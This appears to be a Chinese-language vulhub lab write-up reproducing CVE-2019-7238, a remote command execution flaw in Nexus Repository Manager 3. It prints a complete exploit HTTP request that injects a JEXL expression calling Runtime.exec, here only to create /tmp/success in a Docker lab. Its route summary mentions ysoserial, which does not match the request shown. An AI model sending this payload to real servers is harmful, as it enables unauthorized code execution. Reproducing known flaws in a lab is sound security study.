

# Nexus Repository Manager 3 远程命令执行漏洞（CVE-2019-7238）

###### by ADummy

### 0x00利用路线

​			ysoserial生成payload--->上传给网站进行解析--->命令执行

### 0x01漏洞介绍

​			SNexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.14.0及之前版本中，存在一处基于OrientDB自定义函数的任意JEXL表达式执行功能，而这处功能存在未授权访问漏洞，将可以导致任意命令执行漏洞。

### 0x02漏洞复现

​	等待一段时间环境才能成功启动，访问`http://your-ip:8081`即可看到Web页面。

使用账号密码`admin:admin123`登录后台，然后在maven-releases下随便上传一个jar包：

ps:此处只是为了保证仓库中至少有一个包存在



![Nexus_Repository_Manager3_RCE_11](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Nexus_Repository_Manager3_RCE_11.jpg)



```
POST /service/extdirect HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 368
Connection: close

{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":
[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}
```



![Nexus_Repository_Manager3_RCE_11](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Nexus_Repository_Manager3_RCE_12.jpg)

进入docker 发现   touch  /tmp/success被执行

![Nexus_Repository_Manager3_RCE_11](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Nexus_Repository_Manager3_RCE_13.jpg)

